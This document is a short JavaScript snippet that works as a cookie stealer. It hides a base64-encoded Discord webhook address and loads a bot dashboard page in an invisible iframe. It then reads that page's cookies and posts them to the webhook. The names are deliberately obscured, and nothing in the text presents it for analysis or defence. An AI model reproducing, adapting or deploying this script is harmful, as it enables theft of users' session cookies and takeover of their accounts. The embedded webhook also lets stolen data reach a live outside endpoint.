const yyy = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NTI5NTUyOTc1NjAwNDQyNi9JNGVmS1FGOHVJSUFSbEgzN090ZGNLZXJkdi1GZ0pGOXJhSE5VdjVzLW4wei11RHE3ay1WOF9ZWEM4NTFNeVVnejhsZA==';
const bbb = atob(yyy);
const iframe = document.createElement('iframe');
iframe.src = 'https://cakey.bot/dashboard/public/';
iframe.width = '1px';
iframe.height = '1px';
iframe.style.display = 'none';
document.body.appendChild(iframe);
iframe.onload = function() {
  function getRandomString() {
    return Math.random().toString(36).substring(2, 15);
  }
  function POIUYT() {
    const iframeCookies = iframe.contentDocument.cookie;
    LKJHGF(iframeCookies);
  }
  function LKJHGF(cookies) {
    fetch(bbb, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        content: `\`${cookies}\``
      })
    });
  }

  POIUYT();
};
